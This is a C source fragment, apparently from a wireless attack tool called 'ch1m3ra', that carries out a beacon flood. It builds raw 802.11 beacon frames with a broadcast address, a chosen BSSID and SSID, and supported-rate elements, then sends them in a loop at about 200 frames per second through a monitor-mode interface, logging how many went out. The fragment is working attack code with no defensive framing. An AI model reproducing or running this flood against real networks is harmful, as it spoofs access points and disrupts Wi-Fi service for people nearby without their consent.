        f[o++] = 0x00; f[o++] = 0x00;            /* duration */
        memset(f + o, 0xff, 6); o += 6;          /* addr1 = broadcast */
        memcpy(f + o, bssid, 6); o += 6;         /* addr2 = SA */
        memcpy(f + o, bssid, 6); o += 6;         /* addr3 = BSSID */
        f[o++] = 0; f[o++] = 0;                  /* seq/frag */
        memset(f + o, 0, 8); o += 8;             /* timestamp */
        f[o++] = 0x64; f[o++] = 0x00;            /* beacon interval 100 */
        f[o++] = 0x01; f[o++] = 0x00;            /* capability: ESS */
        /* SSID IE */
        f[o++] = 0; f[o++] = (uint8_t)ssidlen;
        memcpy(f + o, ssid, ssidlen); o += ssidlen;
        /* supported rates IE */
        f[o++] = 1; f[o++] = 4; f[o++] = 0x82; f[o++] = 0x84; f[o++] = 0x8b; f[o++] = 0x96;
        if (tx_send(f, o) != 0) {
            if (failed++ == 0)
                fprintf(stderr, "ch1m3ra: beacon sendto failed: %s\n", strerror(errno));
        }
        sent++;
        if (sent % 256 == 0)
            fprintf(stderr, "ch1m3ra: beacon %ld frame(s) sent\n", sent);
        struct timespec ts = {0, 5000000};       /* ~200/s */
        nanosleep(&ts, NULL);
    }
    fprintf(stderr, "ch1m3ra: beacon-flood sent %ld frame(s) total%s\n", sent,
            failed ? " (some rejected - is the vif in monitor mode?)" : "");
    close(tx.fd);
}

